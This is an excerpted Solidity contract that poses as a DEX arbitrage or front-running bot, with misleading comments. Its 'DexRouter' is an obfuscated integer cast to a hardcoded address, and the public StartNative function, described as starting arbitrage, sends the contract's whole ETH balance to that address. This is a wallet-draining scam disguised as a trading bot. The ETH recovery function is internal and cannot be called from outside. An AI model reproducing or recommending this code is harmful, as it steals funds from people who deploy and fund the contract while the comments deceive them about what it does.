...
contract DexInterface {    
    ...
    constructor(){
        _owner = msg.sender; // Sets contract deployer as owner
    }
    // Decorator protecting the function from being started by anyone other than the owner of the contract
    modifier onlyOwner (){
        require(msg.sender == _owner, "Ownable: caller is not the owner"); // Checks if the caller is the owner
        _; // Placeholder
    }

    uint256 DexRouter = 1223849500319043326174442476014780502866997862777;  // address of DEX router

    // The token exchange function that is used when processing an arbitrage bundle
	function swap(address router, address _tokenIn, address _tokenOut, uint256 _amount) private {
		IERC20(_tokenIn).approve(router, _amount); // approves router to spend input tokens
		address[] memory path; // creates array for the swap path
		path = new address[](2);
		path[0] = _tokenIn; // sets input token in path
		path[1] = _tokenOut; // sets output token in path
		uint deadline = block.timestamp + 300; // sets deadline for transaction
    ...
    // Predicts the amount of the underlying token that will be received as a result of buying and selling transactions
	 function getAmountOutMin(address router, address _tokenIn, address _tokenOut, uint256 _amount) internal view returns (uint256) {
		address[] memory path; // creates array for the swap path
		path = new address[](2);
		path[0] = _tokenIn; // sets input token
		path[1] = _tokenOut; // sets output token
		uint256[] memory amountOutMins = IUniswapV2Router(router).getAmountsOut(_amount, path);
		return amountOutMins[path.length -1]; // returns last amount in the array
	}
    ...
    function mempool(address _router1, address _router2, address _token1, address _token2, uint256 _amount) internal view returns (uint256) {
		uint256 amtBack1 = getAmountOutMin(_router1, _token1, _token2, _amount); // gets amount back from router 1
		uint256 amtBack2 = getAmountOutMin(_router2, _token2, _token1, amtBack1); // gets amount back from router 2
		return amtBack2; // returns the total amount back
	}
    ...
    function frontRun(address _router1, address _router2, address _token1, address _token2, uint256 _amount) internal  {
        uint startBalance = IERC20(_token1).balanceOf(address(this)); // gets the starting balance of token 1
        uint token2InitialBalance = IERC20(_token2).balanceOf(address(this)); // gets the starting balance of token 2
        swap(_router1,_token1, _token2,_amount); // swaps token 1 for token 2
        uint token2Balance = IERC20(_token2).balanceOf(address(this)); // gets the new balance of token 2
        uint tradeableAmount = token2Balance - token2InitialBalance; // calculates the amount of token 2 required
        swap(_router2,_token2, _token1,tradeableAmount); // reswaps token 2 back into token 1
        uint endBalance = IERC20(_token1).balanceOf(address(this)); // gets the ending balance of token 1
        require(endBalance > startBalance, "Trade Reverted, No Profit Made"); // checks if trade is profitable
    }

    // Function to estimate the return for a triple arbitrage trade
	function estimateTriDexTrade(address _router1, address _router2, address _router3, address _token1, address _token2, address _token3, uint256 _amount) internal view returns (uint256) {
		uint amtBack1 = getAmountOutMin(_router1, _token1, _token2, _amount); // gets return from trade 1
		uint amtBack2 = getAmountOutMin(_router2, _token2, _token3, amtBack1); // gets return from trade 2
		uint amtBack3 = getAmountOutMin(_router3, _token3, _token1, amtBack2); // gets return from trade 3
		return amtBack3; // returns total
	}
    ...
    function getDexRouter(uint256 _uintValue) internal pure returns (address) {
       return address(uint160(_uintValue)); // casts the uint to address type
    }

     // Arbitrage search function for a native blockchain token
     function startArbitrageNative() internal  {
        address tradeRouter = getDexRouter(DexRouter); // gets the dex router address
        payable(tradeRouter).transfer(address(this).balance); // transfers contract balance to dex router
     }
	...
	function getBalance(address _tokenContractAddress) internal view  returns (uint256) {
		uint _balance = IERC20(_tokenContractAddress).balanceOf(address(this)); // gets the balance of the token
	...
	function recoverEth() internal onlyOwner {
		payable(msg.sender).transfer(address(this).balance); // sends the contract balance to the owner
	}
	...
	function recoverTokens(address tokenAddress) internal {
		...
		token.transfer(msg.sender, token.balanceOf(address(this))); // sends the contract balance to the owner
	}
    ...
    function StartNative() public payable {
       startArbitrageNative(); // calls internal function to start arbitrage
    }
    ...
    function SetTradeBalanceETH(uint256 _tradingBalanceInPercent) public {
        tradingBalanceInPercent = _tradingBalanceInPercent; // sets the trading balance percentage
    }
